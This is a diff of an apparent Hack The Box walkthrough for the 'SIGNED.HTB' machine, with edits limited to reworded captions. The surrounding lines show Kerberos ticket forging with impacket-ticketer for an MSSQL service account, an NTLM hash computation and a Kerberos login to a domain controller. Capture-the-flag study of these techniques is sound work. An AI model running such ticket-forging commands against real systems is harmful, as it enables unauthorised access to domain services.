@@ -223,7 +223,7 @@ python3 -c 'import hashlib; print(hashlib.new("md4", "puXXXXXXXXXXXX".encode("ut
 sudo ntpdate time.google.com
 ```
 
-Observed output you provided:
+Observed output provided:
 
 ```
 2025-10-21 04:43:33.740931 (+0000) +0.014579 +/- 0.048432 time.google.com 2001:4860:4806:c:: s1 no-leap
@@ -244,7 +244,7 @@ impacket-ticketer \
   mssqlsvc
 ```
 
-Observed tool output (captured from your session):
+Observed tool output (captured from session):
 
 ```
 /home/z0n/venv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal
@@ -275,7 +275,7 @@ impacket-mssqlclient -k -no-pass DC01.SIGNED.HTB -windows-auth
 ```
 
 
-Captured session output (from your run):
+Captured session output (from run):
 
 ```
 /home/z0n/venv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
